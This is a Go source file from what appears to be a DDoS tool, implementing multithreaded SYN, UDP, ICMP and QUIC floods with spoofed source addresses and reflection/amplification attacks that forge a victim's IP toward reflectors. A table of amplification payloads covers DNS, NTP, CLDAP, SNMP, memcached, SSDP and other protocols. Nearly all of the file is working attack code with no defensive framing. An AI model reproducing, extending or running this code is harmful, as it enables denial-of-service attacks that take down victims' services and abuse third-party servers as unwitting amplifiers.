package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"

	"context"
	"runtime"
	"strings"

	"golang.org/x/net/icmp"
)

// cachedPID avoids repeated os.Getpid() syscalls in the hot send loop. FIX P2.
var cachedPID = uint16(os.Getpid() & 0xffff)

// Windows-specific raw socket constants not exported by syscall package
const (
	IPPROTO_TCP = 6
	IPPROTO_UDP = 17
	IPPROTO_RAW = 255
	IP_HDRINCL  = 2
	SOCK_RAW    = 3
)

// checksum computes the Internet checksum (RFC 1071).
func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i:]))
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// randomPublicIP returns a random public IPv4 address.
func randomPublicIP() net.IP {
	for {
		a := byte(rand.Intn(223) + 1)
		b := byte(rand.Intn(255))
		c := byte(rand.Intn(255))
		d := byte(rand.Intn(254) + 1)
		if a == 10 || a == 127 || (a == 172 && b >= 16 && b <= 31) || (a == 192 && b == 168) || a == 169 {
			continue
		}
		return net.IP{a, b, c, d}
	}
}

// buildIPHeader returns a 20-byte IPv4 header.
func buildIPHeader(srcIP, dstIP net.IP, protocol byte, totalLen int) []byte {
	hdr := make([]byte, 20)
	hdr[0] = 0x45
	binary.BigEndian.PutUint16(hdr[2:], uint16(totalLen))
	binary.BigEndian.PutUint16(hdr[4:], uint16(rand.Intn(65535)))
	hdr[8] = 64 // TTL
	hdr[9] = protocol
	copy(hdr[12:16], srcIP.To4())
	copy(hdr[16:20], dstIP.To4())
	binary.BigEndian.PutUint16(hdr[10:], checksum(hdr))
	return hdr
}

// buildSYN builds a crafted IP+TCP SYN packet with spoofed srcIP.
func buildSYN(srcIP, dstIP net.IP, dstPort uint16) []byte {
	srcPort := uint16(rand.Intn(60000) + 1024)
	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], dstPort)
	binary.BigEndian.PutUint32(tcp[4:], rand.Uint32())
	tcp[12] = 0x50 // header length
	tcp[13] = 0x02 // SYN flag
	binary.BigEndian.PutUint16(tcp[14:], 65535)
	pseudo := make([]byte, 12+len(tcp))
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(tcp)))
	copy(pseudo[12:], tcp)
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))
	ip := buildIPHeader(srcIP, dstIP, IPPROTO_TCP, 20+len(tcp))
	return append(ip, tcp...)
}

// buildSpoofedUDP builds a raw IP+UDP packet spoofing srcIP = victimIP.
func buildSpoofedUDP(victimIP net.IP, victimPort uint16, reflIP net.IP, reflPort uint16, payload []byte) []byte {
	srcPort := victimPort
	if srcPort == 0 {
		srcPort = uint16(rand.Intn(60000) + 1024)
	}
	udpLen := 8 + len(payload)
	udp := make([]byte, udpLen)
	binary.BigEndian.PutUint16(udp[0:], srcPort)
	binary.BigEndian.PutUint16(udp[2:], reflPort)
	binary.BigEndian.PutUint16(udp[4:], uint16(udpLen))
	copy(udp[8:], payload)
	pseudo := make([]byte, 12+udpLen)
	copy(pseudo[0:4], victimIP.To4())
	copy(pseudo[4:8], reflIP.To4())
	pseudo[9] = IPPROTO_UDP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(udpLen))
	copy(pseudo[12:], udp)
	binary.BigEndian.PutUint16(udp[6:], checksum(pseudo))
	ip := buildIPHeader(victimIP, reflIP, IPPROTO_UDP, 20+udpLen)
	return append(ip, udp...)
}

var (
	// sync.Pool for reusable payload buffers (1400 bytes)
	payloadPool = sync.Pool{
		New: func() interface{} {
			buf := make([]byte, 1400)
			return &buf
		},
	}
)

// pseudoPool reuses TCP pseudo-header buffers to reduce GC pressure. FIX P1.
var pseudoPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 32) // 12 pseudo hdr + 20 TCP hdr
		return &buf
	},
}

func startL4Attack(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, attackType string, threads int, duration time.Duration, reflectors []ReflectorData, pps int) {
	LogInfo("L4", "Starting %s attack on %s:%d for %v with %d threads (PPS limit: %d)", attackType, targetIP, targetPort, duration, threads, pps)

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() {
				if r := recover(); r != nil {
					LogErr("SYS", "Panic in L4: %v", r)
				}
			}()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			// Local PRNG to avoid global lock
			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			// Socket/Conn per thread
			var udpConn *net.UDPConn
			var icmpConn *icmp.PacketConn
			var synSock SocketHandle = InvalidSocket
			var ampSock SocketHandle = InvalidSocket

			if attackType == "udp" {
				addr := &net.UDPAddr{IP: net.ParseIP(targetIP), Port: targetPort}
				if addr.IP != nil {
					udpConn, _ = opts.NetTarget.DialUDP("udp", nil, addr)
					// FIX: Always open raw socket for UDP if spoofing is allowed
					ampSock, _ = openRawSocket(IPPROTO_RAW)
				}
				if udpConn != nil {
					defer udpConn.Close()
				}
			} else if attackType == "icmp" {
				icmpConn, _ = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
				if icmpConn != nil {
					defer icmpConn.Close()
				}
				ampSock, _ = openRawSocket(IPPROTO_RAW)
				if ampSock != InvalidSocket {
					defer closeSocket(ampSock)
				}
				// Also open udpConn for non-spoofed path
				addr := &net.UDPAddr{IP: net.ParseIP(targetIP), Port: targetPort}
				if addr.IP != nil {
					udpConn, _ = opts.NetTarget.DialUDP("udp", nil, addr)
				}
				if udpConn != nil {
					defer udpConn.Close()
				}
			} else if attackType == "syn" {
				synSock, _ = openRawSocket(IPPROTO_TCP)
				if synSock != InvalidSocket {
					defer closeSocket(synSock)
				}
			} else if attackType == "amp" {
				ampSock, _ = openRawSocket(IPPROTO_RAW)
				if ampSock != InvalidSocket {
					defer closeSocket(ampSock)
				}
			}

			bufPtr := payloadPool.Get().(*[]byte)
			payload := *bufPtr
			defer payloadPool.Put(bufPtr)
			localRand.Read(payload)

			for {
				// Work in batches to reduce select/timer overhead
				// Higher batchSize = more stability at high PPS
				batchSize := 64
				if pps > 0 {
					// Adjust batchSize to ensure we don't exceed PPS too much between sleeps
					// 100000 / 32 / 1000 = ~3 batches per ms
					if pps < 1000 {
						batchSize = 1
					} else if pps < 10000 {
						batchSize = 8
					}

					// Sleep relative to batch size
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					// Per-thread pre-allocated buffers to minimize GC pressure
					synBuf := make([]byte, 40) // 20 IP + 20 TCP
					udpBuf := make([]byte, 1500)
					icmpBuf := make([]byte, 1500)

					for b := 0; b < batchSize; b++ {
						switch attackType {
						case "syn":
							if synSock != InvalidSocket {
								var srcIP net.IP
								if opts.Config.NoSpoofing {
									srcIP = getLocalSrcIP(targetIP)
								} else if opts.Config.UseMixed && localRand.Intn(2) == 0 {
									srcIP = getLocalSrcIP(targetIP)
								} else {
									srcIP = randomPublicIPLocal(localRand)
								}
								// Reuse synBuf (optimized)
								packet := buildSYNLocalOptimized(srcIP, net.ParseIP(targetIP).To4(), uint16(targetPort), localRand, synBuf)
								sendtoRaw(synSock, packet, net.ParseIP(targetIP).To4(), targetPort)
								AddStats(1, int64(len(packet)))
							}
						case "udp":
							if opts.Config.NoSpoofing {
								if udpConn != nil {
									localRand.Read(payload[:8])
									udpConn.Write(payload)
									AddStats(1, 1400)
								}
							} else {
								// Spoofed path
								if ampSock != InvalidSocket {
									var srcIP net.IP
									if opts.Config.UseMixed && localRand.Intn(2) == 0 {
										// 50% mixed path: use real local IP
										srcIP = getLocalSrcIP(targetIP)
									} else {
										srcIP = randomPublicIPLocal(localRand)
									}
									packet := buildUDPLocalOptimized(srcIP, net.ParseIP(targetIP).To4(), uint16(localRand.Intn(60000)+1024), uint16(targetPort), payload, localRand, udpBuf)
									sendtoRaw(ampSock, packet, net.ParseIP(targetIP).To4(), targetPort)
									AddStats(1, int64(len(packet)))
								}
							}
						case "icmp":
							if icmpConn != nil {
								sendICMPLocalOptimized(targetIP, icmpConn, payload, localRand, icmpBuf)
							}
						case "amp":
							if ampSock != InvalidSocket && len(reflectors) > 0 {
								r := reflectors[localRand.Intn(len(reflectors))]
								sendAmpRawLocalOptimized(ampSock, targetIP, targetPort, r.Addr, r.Port, localRand, udpBuf)
							}
						case "quic":
							pkt := payloadQuic
							localRand.Read(payload[:8])
							if opts.Config.NoSpoofing {
								if udpConn != nil {
									udpConn.Write(pkt)
									AddStats(1, int64(len(pkt)))
								}
							} else {
								if ampSock != InvalidSocket {
									var srcIP net.IP
									if opts.Config.UseMixed && localRand.Intn(2) == 0 {
										srcIP = getLocalSrcIP(targetIP)
									} else {
										srcIP = randomPublicIPLocal(localRand)
									}
									packet := buildUDPLocalOptimized(srcIP, net.ParseIP(targetIP).To4(), uint16(localRand.Intn(60000)+1024), uint16(targetPort), pkt, localRand, udpBuf)
									sendtoRaw(ampSock, packet, net.ParseIP(targetIP).To4(), targetPort)
									AddStats(1, int64(len(packet)))
								}
							}
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()

	fmt.Printf("[OK] %s Attack finished\n", attackType)
}

// sendSYNRawLocal sends a SYN packet using local PRNG.
func sendSYNRawLocal(synSock SocketHandle, targetIP string, targetPort int, localRand *rand.Rand) {
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}
	srcIP := randomPublicIPLocal(localRand)
	packet := buildSYNLocal(srcIP, dstIP, uint16(targetPort), localRand)

	if synSock != InvalidSocket {
		sendtoRaw(synSock, packet, dstIP, targetPort)
		AddStats(1, int64(len(packet)))
	}
}

func sendSYNRawLocalOptimized(synSock SocketHandle, targetIP string, targetPort int, localRand *rand.Rand, buf []byte) {
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}
	srcIP := randomPublicIPLocal(localRand)
	packet := buildSYNLocalOptimized(srcIP, dstIP, uint16(targetPort), localRand, buf)

	if synSock != InvalidSocket {
		sendtoRaw(synSock, packet, dstIP, targetPort)
		AddStats(1, int64(len(packet)))
	}
}

// randomPublicIPLocal returns a random public IPv4 address using local PRNG.
func randomPublicIPLocal(localRand *rand.Rand) net.IP {
	for {
		a := byte(localRand.Intn(223) + 1)
		b := byte(localRand.Intn(255))
		c := byte(localRand.Intn(255))
		d := byte(localRand.Intn(254) + 1)
		if a == 10 || a == 127 || (a == 172 && b >= 16 && b <= 31) || (a == 192 && b == 168) || a == 169 {
			continue
		}
		return net.IP{a, b, c, d}
	}
}

func buildSYNLocalOptimized(srcIP, dstIP net.IP, dstPort uint16, localRand *rand.Rand, buf []byte) []byte {
	srcPort := uint16(localRand.Intn(60000) + 1024)

	tcp := buf[20:40]
	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], dstPort)
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32())
	tcp[12] = 0x50
	tcp[13] = 0x02
	binary.BigEndian.PutUint16(tcp[14:], 65535)

	// FIX P1: Reuse pseudo-header buffer from pool to reduce GC pressure
	pseudoPtr := pseudoPool.Get().(*[]byte)
	pseudo := (*pseudoPtr)[:32]
	defer pseudoPool.Put(pseudoPtr)
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], 20)
	copy(pseudo[12:], tcp)

	// ASSEMBLY ORDER FIX: Write checksum directly into the FINAL buffer
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))

	buildIPHeaderLocalOptimized(srcIP, dstIP, IPPROTO_TCP, 40, localRand, buf[0:20])
	return buf[:40]
}

func buildIPHeaderLocalOptimized(srcIP, dstIP net.IP, protocol byte, totalLen int, localRand *rand.Rand, hdr []byte) {
	hdr[0] = 0x45
	hdr[1] = 0
	binary.BigEndian.PutUint16(hdr[2:], uint16(totalLen))
	binary.BigEndian.PutUint16(hdr[4:], uint16(localRand.Intn(65535)))
	hdr[6] = 0
	hdr[7] = 0
	hdr[8] = 64
	hdr[9] = protocol
	hdr[10] = 0
	hdr[11] = 0
	copy(hdr[12:16], srcIP.To4())
	copy(hdr[16:20], dstIP.To4())
	binary.BigEndian.PutUint16(hdr[10:], checksum(hdr))
}

func buildUDPLocalOptimized(srcIP, dstIP net.IP, srcPort, dstPort uint16, payload []byte, localRand *rand.Rand, buf []byte) []byte {
	// IP header (20) + UDP header (8) + payload (len)
	totalLen := 28 + len(payload)
	udp := buf[20:28]
	binary.BigEndian.PutUint16(udp[0:], srcPort)
	binary.BigEndian.PutUint16(udp[2:], dstPort)
	binary.BigEndian.PutUint16(udp[4:], uint16(8+len(payload)))
	binary.BigEndian.PutUint16(udp[6:], 0) // Checksum 0 is valid for UDP/IPv4

	// Copy payload
	copy(buf[28:], payload)

	buildIPHeaderLocalOptimized(srcIP, dstIP, IPPROTO_UDP, totalLen, localRand, buf[0:20])
	return buf[:totalLen]
}

// buildSYNLocal builds a crafted IP+TCP SYN packet with spoofed srcIP.
func buildSYNLocal(srcIP, dstIP net.IP, dstPort uint16, localRand *rand.Rand) []byte {
	srcPort := uint16(localRand.Intn(60000) + 1024)
	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], dstPort)
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32())
	tcp[12] = 0x50
	tcp[13] = 0x02
	binary.BigEndian.PutUint16(tcp[14:], 65535)
	pseudo := make([]byte, 12+len(tcp))
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(tcp)))
	copy(pseudo[12:], tcp)
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))
	ip := buildIPHeaderLocal(srcIP, dstIP, IPPROTO_TCP, 20+len(tcp), localRand)
	return append(ip, tcp...)
}

// buildIPHeaderLocal returns a 20-byte IPv4 header.
func buildIPHeaderLocal(srcIP, dstIP net.IP, protocol byte, totalLen int, localRand *rand.Rand) []byte {
	hdr := make([]byte, 20)
	hdr[0] = 0x45
	binary.BigEndian.PutUint16(hdr[2:], uint16(totalLen))
	binary.BigEndian.PutUint16(hdr[4:], uint16(localRand.Intn(65535)))
	hdr[8] = 64 // TTL
	hdr[9] = protocol
	copy(hdr[12:16], srcIP.To4())
	copy(hdr[16:20], dstIP.To4())
	binary.BigEndian.PutUint16(hdr[10:], checksum(hdr))
	return hdr
}

func buildSpoofedUDPLocal(victimIP net.IP, victimPort uint16, reflIP net.IP, reflPort uint16, payload []byte, localRand *rand.Rand) []byte {
	srcPort := victimPort
	if srcPort == 0 {
		srcPort = uint16(localRand.Intn(60000) + 1024)
	}
	udpLen := 8 + len(payload)
	udp := make([]byte, udpLen)
	binary.BigEndian.PutUint16(udp[0:], srcPort)
	binary.BigEndian.PutUint16(udp[2:], reflPort)
	binary.BigEndian.PutUint16(udp[4:], uint16(udpLen))
	copy(udp[8:], payload)
	pseudo := make([]byte, 12+udpLen)
	copy(pseudo[0:4], victimIP.To4())
	copy(pseudo[4:8], reflIP.To4())
	pseudo[9] = IPPROTO_UDP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(udpLen))
	copy(pseudo[12:], udp)
	binary.BigEndian.PutUint16(udp[6:], checksum(pseudo))
	ip := buildIPHeaderLocal(victimIP, reflIP, IPPROTO_UDP, 20+udpLen, localRand)
	return append(ip, udp...)
}
func sendICMPLocalOptimized(targetIP string, c *icmp.PacketConn, payload []byte, localRand *rand.Rand, wb []byte) {
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}

	packetLen := 8 + 8
	wb = wb[:packetLen]
	for i := range wb {
		wb[i] = 0
	}

	wb[0] = 8
	wb[1] = 0
	binary.BigEndian.PutUint16(wb[4:], cachedPID)
	binary.BigEndian.PutUint16(wb[6:], uint16(localRand.Intn(65535)))
	copy(wb[8:], payload[:8])

	binary.BigEndian.PutUint16(wb[2:], checksum(wb))

	if n, err := c.WriteTo(wb, &net.IPAddr{IP: dstIP}); err == nil {
		AddStats(1, int64(n))
	}
}

func sendAmpRawLocalOptimized(ampSock SocketHandle, targetIP string, targetPort int, reflectorAddr string, reflectorPort int, localRand *rand.Rand, buf []byte) {
	victimIP := net.ParseIP(targetIP).To4()
	cleanReflIP := reflectorAddr
	if h, _, err := net.SplitHostPort(reflectorAddr); err == nil {
		cleanReflIP = h
	}
	reflIP := net.ParseIP(cleanReflIP).To4()
	if victimIP == nil || reflIP == nil {
		return
	}

	payload := getAmpPayload(reflectorPort)
	if ampSock != InvalidSocket {
		packet := buildSpoofedUDPLocalOptimized(victimIP, uint16(targetPort), reflIP, uint16(reflectorPort), payload, localRand, buf)
		sendtoRaw(ampSock, packet, reflIP, reflectorPort)
		AddStats(1, int64(len(packet)))
	}
}

func buildSpoofedUDPLocalOptimized(victimIP net.IP, victimPort uint16, reflIP net.IP, reflPort uint16, payload []byte, localRand *rand.Rand, buf []byte) []byte {
	srcPort := victimPort
	if srcPort == 0 {
		srcPort = uint16(localRand.Intn(60000) + 1024)
	}
	udpLen := 8 + len(payload)
	totalLen := 20 + udpLen

	udp := buf[20:totalLen]
	binary.BigEndian.PutUint16(udp[0:], srcPort)
	binary.BigEndian.PutUint16(udp[2:], reflPort)
	binary.BigEndian.PutUint16(udp[4:], uint16(udpLen))
	udp[6] = 0
	udp[7] = 0
	copy(udp[8:], payload)

	pseudo := make([]byte, 12+udpLen)
	copy(pseudo[0:4], victimIP.To4())
	copy(pseudo[4:8], reflIP.To4())
	pseudo[9] = IPPROTO_UDP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(udpLen))
	copy(pseudo[12:], udp)

	// ASSEMBLY ORDER FIX: Write checksum directly into the FINAL buffer
	binary.BigEndian.PutUint16(udp[6:], checksum(pseudo))

	buildIPHeaderLocalOptimized(victimIP, reflIP, IPPROTO_UDP, totalLen, localRand, buf[0:20])
	return buf[:totalLen]
}

var (
	dnsDomains     = []string{"ietf.org", "isoc.org", "root-servers.net", "icann.org", "ripe.net"}
	payloadNtp     = []byte("\x17\x00\x03\x2a" + strings.Repeat("\x00", 44))
	payloadCldap   = []byte("\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\xff\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00")
	payloadSnmp    = []byte("\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa1\x19\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00")
	payloadSource  = []byte("\xff\xff\xff\xff\x54Source Engine Query\x00")
	payloadPortmap = []byte("\x80\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
	payloadMemcd   = []byte("\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n")
	payloadSsdp    = []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n")
	payloadCoap    = []byte("\x40\x01\x7d\x70\xbb\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x04\x63\x6f\x72\x65")
	payloadWsd     = []byte("<?xml version=\"1.0\" encoding=\"utf-8\"?><Envelope xmlns:dn=\"http://www.onvif.org/ver10/network/wsdl\" xmlns=\"http://www.w3.org/2003/05/soap-envelope\"><Header><Body><Probe><Types>dn:NetworkVideoTransmitter</Types></Probe></Body></Header></Envelope>")
	payloadQuic    = append([]byte("\xc0\x00\x00\x00\x01\x08\x00\x00\x00\x00\x00\x00\x00\x00"), make([]byte, 1186)...)
	payloadDtls    = []byte("\x16\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x01\x03\x00\x00\x00\x00\x00\x00\x01\x03\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00")
	payloadStun    = []byte("\x00\x01\x00\x00\x21\x12\xA4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
	payloadDht     = []byte("d1:ad2:id20:abcdefghij01234567896target20:mnopqrstuvwxyz123456e1:q9:find_node1:t2:aa1:y1:qe")
	payloadMdns    = []byte("\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0c_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01")
	payloadBacnet  = []byte("\x81\x0a\x00\x0c\x01\x20\xff\xff\x00\xff\x10\x08")
	payloadGeneric = []byte("\x00\x00\x00\x00")
)

func getAmpPayload(port int) []byte {
	switch port {
	case 53:
		domain := dnsDomains[rand.Intn(len(dnsDomains))]
		parts := strings.Split(domain, ".")
		payload := []byte{0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01}
		for _, p := range parts {
			payload = append(payload, byte(len(p)))
			payload = append(payload, p...)
		}
		payload = append(payload, 0x00, 0x00, 0xff, 0x00, 0x01, 0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00)
		return payload
	case 123:
		return payloadNtp
	case 389:
		return payloadCldap
	case 161:
		return payloadSnmp
	case 27015:
		return payloadSource
	case 111:
		return payloadPortmap
	case 11211:
		return payloadMemcd
	case 1900:
		return payloadSsdp
	case 5683:
		return payloadCoap
	case 3702:
		return payloadWsd
	case 443:
		return payloadQuic
	case 4433:
		return payloadDtls
	case 3478:
		return payloadStun
	case 6881:
		return payloadDht
	case 5353:
		return payloadMdns
	case 47808:
		return payloadBacnet
	default:
		return payloadGeneric
	}
}

func getLocalSrcIP(target string) net.IP {
	conn, err := net.Dial("udp", target+":1")
	if err != nil {
		return net.IPv4(127, 0, 0, 1)
	}
	defer conn.Close()
	addr, ok := conn.LocalAddr().(*net.UDPAddr)
	if !ok {
		return net.IPv4(127, 0, 0, 1)
	}
	return addr.IP
}
